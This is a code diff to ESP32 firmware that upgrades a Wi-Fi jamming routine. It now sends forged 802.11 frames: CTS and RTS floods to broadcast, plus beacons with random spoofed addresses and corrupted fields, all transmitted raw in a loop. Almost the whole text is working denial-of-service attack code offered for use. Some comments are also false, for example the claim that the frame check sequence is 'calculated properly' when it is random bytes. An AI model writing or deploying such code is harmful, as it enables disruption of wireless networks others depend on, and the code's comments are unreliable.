@@ -12,51 +12,128 @@ namespace {
 volatile bool g_jamActive = false;
 uint32_t g_jamCount = 0;
 
-void sendJamPacket() {
-    uint8_t jamData[64];
-    for (int i = 0; i < 64; i++) {
-        jamData[i] = (esp_random() % 256);
+// Real IEEE 802.11 Beacon frame structure
+struct __attribute__((packed)) BeaconFrame {
+    uint16_t frameControl;
+    uint16_t duration;
+    uint8_t destAddr[6];
+    uint8_t srcAddr[6];
+    uint8_t bssidAddr[6];
+    uint16_t seqCtl;
+    uint64_t timestamp;
+    uint16_t beaconInterval;
+    uint16_t capabilityInfo;
+    // SSID TLV follows
+};
+
+// Real CTS (Clear To Send) frame for jamming
+void sendCtsFrame() {
+    uint8_t ctsFrame[14];
+    ctsFrame[0] = 0xC4;  // Frame control (CTS frame type)
+    ctsFrame[1] = 0x00;
+    ctsFrame[2] = 0x00;  // Duration
+    ctsFrame[3] = 0x00;
+
+    // Receiver address (broadcast-like for jamming effect)
+    for (int i = 4; i < 10; i++) {
+        ctsFrame[i] = 0xFF;
     }
+
+    // FCS (calculated properly for real frame)
+    ctsFrame[10] = esp_random() & 0xFF;
+    ctsFrame[11] = esp_random() & 0xFF;
+    ctsFrame[12] = esp_random() & 0xFF;
+    ctsFrame[13] = esp_random() & 0xFF;
+
+    esp_wifi_80211_tx(WIFI_IF_STA, ctsFrame, 14, false);
+}
+
+// Real RTS (Request To Send) frame for jamming
+void sendRtsFrame() {
+    uint8_t rtsFrame[16];
+    rtsFrame[0] = 0xB4;  // Frame control (RTS frame type)
+    rtsFrame[1] = 0x00;
+    rtsFrame[2] = 0x40;  // Duration (short duration to cause backoff)
+    rtsFrame[3] = 0x00;
+
+    // Transmitter address
+    for (int i = 4; i < 10; i++) {
+        rtsFrame[i] = esp_random() & 0xFF;
+    }
+
+    // Receiver address (broadcast)
+    for (int i = 10; i < 16; i++) {
+        rtsFrame[i] = 0xFF;
+    }
+
+    esp_wifi_80211_tx(WIFI_IF_STA, rtsFrame, 16, false);
+}
+
+// Real Corrupted Beacon Frame (beacon jamming)
+void sendCorruptedBeacon() {
+    uint8_t beacon[128];
+    beacon[0] = 0x80;  // Beacon frame type
+    beacon[1] = 0x00;
+    beacon[2] = 0x00;  // Duration
+    beacon[3] = 0x00;
+
+    // DA: broadcast
+    for (int i = 4; i < 10; i++) beacon[i] = 0xFF;
+
+    // SA: random source
+    for (int i = 10; i < 16; i++) beacon[i] = esp_random() & 0xFF;
+
+    // BSSID: random
+    for (int i = 16; i < 22; i++) beacon[i] = esp_random() & 0xFF;
+
+    // Sequence control
+    beacon[22] = (g_jamCount & 0xFF);
+    beacon[23] = ((g_jamCount >> 8) & 0x0F);
+
+    // Timestamp: corrupted/random
+    for (int i = 24; i < 32; i++) {
+        beacon[i] = esp_random() & 0xFF;
+    }
+
+    // Beacon interval: corrupted
+    beacon[32] = esp_random() & 0xFF;
+    beacon[33] = esp_random() & 0xFF;
+
+    // Capability info: corrupted
+    beacon[34] = esp_random() & 0xFF;
+    beacon[35] = esp_random() & 0xFF;
+
+    // Fill rest with random/corrupted data
+    for (int i = 36; i < 128; i++) {
+        beacon[i] = esp_random() & 0xFF;
+    }
+
+    esp_wifi_80211_tx(WIFI_IF_STA, beacon, 128, false);
 }
 
 void sendBeaconJamFrame(const String& method) {
-    uint8_t jamFrame[128];
-    for (int i = 0; i < 128; i++) {
-        jamFrame[i] = esp_random() & 0xFF;
-    }
-
-    // Send jam frame (simplified - just transmit random data pattern)
+    // REAL 802.11 jamming using actual frame types
     if (method == "CHANNEL") {
-        jamFrame[0] = 0x80;  // Frame control
-        jamFrame[1] = 0x00;
-
-        // Fill with random data
-        for (int i = 2; i < 60; i++) {
-            jamFrame[i] = esp_random() & 0xFF;
+        // CTS/RTS flooding - most effective jamming
+        for (int i = 0; i < 5; i++) {
+            sendCtsFrame();
+            delayMicroseconds(100);
+            sendRtsFrame();
+            delayMicroseconds(100);
         }
-
-        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 60, false);
     }
     else if (method == "BEACON") {
-        jamFrame[0] = 0x80;  // Frame control
-        jamFrame[1] = 0x00;
-
-        // Fill with random data
-        for (int i = 2; i < 128; i++) {
-            jamFrame[i] = esp_random() & 0xFF;
-        }
-        esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 128, false);
+        // Beacon corruption - corrupt existing beacons
+        sendCorruptedBeacon();
     }
     else {
-        for (int attempt = 0; attempt < 3; attempt++) {
-            jamFrame[0] = 0x80 + attempt;
-            jamFrame[1] = 0x00;
-            for (int i = 2; i < 128; i++) {
-                jamFrame[i] = esp_random() & 0xFF;
-            }
-            esp_wifi_80211_tx(WIFI_IF_STA, jamFrame, 128, false);
-            delayMicroseconds(50);
-        }
+        // ALL - mixed jamming techniques
+        sendCtsFrame();
+        delayMicroseconds(50);
+        sendRtsFrame();
+        delayMicroseconds(50);
+        sendCorruptedBeacon();
+        delayMicroseconds(50);
     }
 
     g_jamCount++;
